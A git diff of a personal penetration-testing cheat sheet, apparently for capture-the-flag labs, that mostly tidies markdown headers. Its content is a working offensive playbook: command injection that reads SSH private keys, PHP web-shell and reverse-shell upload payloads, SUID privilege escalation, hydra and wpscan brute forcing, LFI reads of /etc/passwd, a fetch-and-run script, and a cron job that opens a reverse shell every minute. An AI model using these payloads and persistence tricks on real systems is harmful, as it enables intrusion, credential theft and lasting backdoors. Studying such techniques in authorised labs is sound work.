@@ -1,8 +1,8 @@
-#Most Important
+# Most Important
 Check hacktricks on any subject. It'll probably have something useful.
 Always try default credentials.
 
-#Reconnaissance
+# Reconnaissance
 https://tio.run/#
 sudo nmap -sC -sV -v -p- 10.10.10.10 --min-rate 10000
 
@@ -11,7 +11,7 @@ dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.
 
 grep -r 'looking_for_this' /in/this/directory
 
-#Command Injection
+# Command Injection
 ;cat /home/<user>/.ssh/id_rsa to get the SSH key
 ;cat /home/<user>/.ssh/id.rsa
 
@@ -25,29 +25,29 @@ touch id.rsa
 
 ssh -i id.rsa user@10.10.10.10
 
-#Getting Remote Command Execution
+# Getting Remote Command Execution
 
 
 
-#File Upload Vulnerability
+# File Upload Vulnerability
 
 Open burpsuite, open an image file that only contains the backdoor, capture the request, and then add .php to the end of the file, so it tries uploading as test.jpg.php, test.gif.php
 
 Can also just try uploading an image file that contains only the backdoor, and if a php exec() exists, that might hit it and give us a backdoor.
 
-#PHP Payloads for File Upload Vulnerability
+# PHP Payloads for File Upload Vulnerability
 
 #Command Backdoor
 <?php echo passthru($_GET['cmd']); ?>
 
 Use like website.com/index.php?pg=/uploads/image.lol?cmd=ls
 
-#Reverse Shell
+# Reverse Shell
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
 
 PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes. We can try ```touch backdoor.jpg && echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'\"); ?>"```
 
-#Privledge Escalation
+# Privledge Escalation
 
 sudo -l
 chmod +s /bin/bash 
@@ -57,9 +57,9 @@ cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell
 below to find SUID binaries
 find / -perm -4000 2>/dev/null 
 
-#Password Cracking
+# Password Cracking
 
-#John The Ripper
+# John The Ripper
 
 To crack a password-protected zip file, first convert it into a hash that John can read
 zip2john file-to-crack.zip > hashed.john
@@ -70,53 +70,55 @@ To crack a SSH key
 ssh2john encrypted-id.rsa > id.rsa.john
 john -w=/usr/share/wordlists/rockyou.txt id.rsa.john
 
-#Hydra
+# Hydra
 hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64
 
 #Abusing Certain Services Angle
 
-#WordPress
+# WordPress
 wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt
 
 If we can grab wordpress admin credentials, we can pretty easily get a shell.
 
-#PostGresSQL
+# PostGresSQL
 psql -h 10.10.10.10 -u <username> default credentials are postgres and postgres
 #Other/Interesting Angles
 
-#Abusing Weird Text
-If there's a weird page with only text, try nc into it, like nc 10.10.10.10 7878
-
-#Overriding Weird Port Numbers on Firefox
-need to go to about:config, and add the port you want to acess, so it can be overridden
-
-#FTP
-ftp 10.10.10.10 
-
-#MySQL
+# MySQL
 mysql -h 10.10.70.250 -u root -p
 
-#NFS
+# Abusing Weird Text
+If there's a weird page with only text, try nc into it, like nc 10.10.10.10 7878
+
+# Overriding Weird Port Numbers on Firefox
+need to go to about:config, and add the port you want to acess, so it can be overridden
+
+# FTP
+ftp 10.10.10.10 
+
+
+# NFS
 sudo showmount -e 10.10.10.10
 mkdir mnt
 sudo mount -t nfs 10.10.10.10:/ ./mnt -o nolock
 
-#Abusing LFI
+# Abusing LFI
 Grab /etc/passwd to enumerate users.
 Then we can try grabbing ssh keys, in /home/<user>/.ssh/id.rsa
 
 
-#Getting Files to/from Server
+# Getting Files to/from Server
 
+Use a web server!
 python -m http.server 8080
 
-#Improving an improved shell
+# Improving an improved shell
 
 python3 -c "import pty;pty.spawn('/bin/bash');"
 
 bash -i
 
-#Useful One Liners, and General Persistence
+# Useful One Liners, and General Persistence
 
 wget 10.10.10.10:8080/kingme.sh && chmod u+x kingme.sh && mkdir /etc/testingdirectory &&  ./kingme.sh - u jtrigg 10.10.10.10 /etc/testingdirectory
 
@@ -133,6 +135,6 @@ Put the below into a file named backdoor.php, and put it in one of the websites,
 
 crontab -l > mycron && echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> mycron && crontab mycron && rm mycron
 
-#Neat Links
+# Neat Links
 https://pentestbook.six2dez.com/enumeration/ports
 https://www.revshells.com/
